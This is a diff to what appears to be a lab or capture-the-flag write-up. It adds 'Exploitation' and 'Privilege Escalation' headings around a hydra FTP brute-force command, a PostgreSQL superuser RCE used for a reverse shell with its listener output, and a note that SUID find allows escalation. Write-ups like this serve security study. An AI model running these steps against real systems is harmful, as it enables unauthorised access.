@@ -105,6 +105,8 @@ I then ran a hydra password brute force attempt on the wilson user account throu
 └─$ hydra -l wilson -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ftp://192.168.191.47
 ~~~
 
+# Exploitation
+
 I found a [RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) exploit that works for Superusers on PostgreSQL version 9.3+ and used it to execute a reverse shell
 
 Create listener on port 80
@@ -135,6 +137,8 @@ connect to [192.168.45.173] from (UNKNOWN) [192.168.191.47] 42184
 whoami
 postgres
 ~~~
+
+# Privilege Escalation
 
 I ran a scan using linpeas.sh which identified the "find" binary has the SUID bit set, which can be used to elevate privileges through the -exec option of the find cmdlet as discussed in [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) list of binaries and bypasses
 ~~~shell
